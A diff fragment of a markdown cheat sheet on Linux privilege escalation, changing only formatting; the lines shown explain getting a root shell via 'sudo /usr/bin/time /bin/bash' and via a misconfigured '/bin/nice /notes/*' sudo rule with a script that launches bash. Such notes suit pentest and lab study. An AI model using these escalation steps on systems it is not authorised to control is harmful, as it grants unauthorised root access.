@@ -36,7 +36,7 @@
   - then use the below command it will give you the root privilege
   - ```sudo /usr/bin/time /bin/bash```
 
-- if you find ```(ALL : ALL) /bin/nice /notes/*``` in sudo -l
+- if you find ```(ALL : ALL) /bin/nice /notes/*``` in ```sudo -l```
   - it shows that you can run all the files in the /notes directory with /bin/nice binary.
   - so create a script letsgetroot.sh which executes /bin/bash and gave the necessary permissions.
   - ```echo "/bin/bash" >> letsgetroot.sh``` save the file in any directory
